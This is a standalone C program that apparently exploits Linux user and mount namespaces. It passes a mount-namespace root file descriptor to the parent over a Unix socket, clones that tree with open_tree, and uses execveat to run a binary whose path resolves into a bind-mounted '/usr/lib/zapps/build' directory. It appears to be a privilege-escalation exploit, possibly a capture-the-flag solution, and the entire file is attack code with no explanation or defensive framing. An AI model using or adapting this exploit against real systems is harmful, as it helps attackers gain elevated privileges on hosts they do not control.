#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sched.h>
#include <err.h>
#include <errno.h>
#include <sys/mount.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <linux/mount.h>

#define CHECK(cmd) ({ errno = 0; int RET = cmd; if (errno != 0) { printf("[!!!] [%s] " #cmd " = %d, errno: %d (%s)\n", __func__, RET, errno, strerror(errno)); exit(-1); } RET; })


void send_fd(int sock, int fd)
{
	struct msghdr msg = {0};
	char buf[CMSG_SPACE(sizeof(int))] = {0};
	struct iovec iov = {
		.iov_base = "A",
		.iov_len = 1
	};

	msg.msg_iov = &iov;
	msg.msg_iovlen = 1;
	msg.msg_control = buf;
	msg.msg_controllen = sizeof(buf);

	struct cmsghdr* cmsg = CMSG_FIRSTHDR(&msg);
	cmsg->cmsg_level = SOL_SOCKET;
	cmsg->cmsg_type = SCM_RIGHTS;
	cmsg->cmsg_len = CMSG_LEN(sizeof(int));

	*((int*)CMSG_DATA(cmsg)) = fd;

	msg.msg_controllen = CMSG_SPACE(sizeof(int));

	CHECK(sendmsg(sock, &msg, 0));
}

int recv_fd(int sock)
{
	struct msghdr msg = {0};
	char foo_buf[0x100] = {0};
	struct iovec iov = {
		.iov_base = foo_buf,
		.iov_len = sizeof(foo_buf)
	};

	msg.msg_iov = &iov;
	msg.msg_iovlen = 1;

	char cbuf[CMSG_SPACE(sizeof(int))] = {0};
	msg.msg_control = cbuf;
	msg.msg_controllen = sizeof(cbuf);

	CHECK(recvmsg(sock, &msg, 0));

	struct cmsghdr* cmsg = CMSG_FIRSTHDR(&msg);
	unsigned char* data = CMSG_DATA(cmsg);
	return *((int*)data);
}

int child_fun(void* args)
{
	int sock = (long)args;
	CHECK(mount("none", "/", NULL, MS_REC | MS_PRIVATE, NULL));
	CHECK(mount("/usr/lib/zapps/build", "/home/user", NULL, MS_BIND, NULL));

	int fd = CHECK(open("/", O_PATH));
	// Send the file descriptor to the parent
	send_fd(sock, fd);
	pause();
	return 0;
}

int main()
{
	// Create the socket pair to send the file descriptor
	int sock_pair[2];
	CHECK(socketpair(AF_UNIX, SOCK_DGRAM | SOCK_CLOEXEC, 0, sock_pair));

	// Create the child's stack
	void* stack = mmap(NULL, 0x100000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_STACK | MAP_GROWSDOWN, -1, 0);
	if (stack == MAP_FAILED) {
		err(1, "mmap");
	}

	// Create the child with new user and mount namespaces
	pid_t child = CHECK(clone(child_fun, stack + 0x100000 - 0x100, CLONE_NEWUSER | CLONE_NEWNS, (void*)(long)sock_pair[0]));

	// Receive the file descriptor from the child
	int root_fd = recv_fd(sock_pair[1]);

	// Clone the child mount namespace's root
	int fd = CHECK(syscall(SYS_open_tree, root_fd, "", AT_EMPTY_PATH | AT_RECURSIVE | OPEN_TREE_CLONE));
	// Execute the binary relative to the child's root
	CHECK(syscall(SYS_execveat, fd, "home/user/exe", NULL, NULL, 0));
}
